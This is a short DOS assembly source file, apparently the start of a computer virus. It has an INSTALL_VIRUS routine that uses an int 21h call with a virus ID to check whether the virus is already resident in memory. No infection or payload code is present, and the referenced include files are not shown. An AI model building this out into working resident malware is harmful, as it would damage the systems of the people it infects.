
.model tiny
include data.asm
include Macro.asm ; the macro help Routines 
include Functions.asm  
.code
;defines where the machine code place in memory
;100H says that the machine code starts from address (offset) 100h in this segment ,For .com format the offset is always 100H
;Another example is ORG 7C00H for intel exe program format.
org 100h 
start:
   ;mov dl,'A' ; print 'A'
   ;mov ah,2h
   ;int 21h
    START:
jmp INSTALL_VIRUS ;go to the installation routine


INSTALL_VIRUS:
GetRelocation bp
;VIRUS RESIDENCY CHECK 
mov ax, nVirusID
int 21h
cmp bx, nVirusID ;virus are installed ?
je VIRUS_ALREADY_INSTALLED



VIRUS_ALREADY_INSTALLED:

END_OF_CODE:
end start



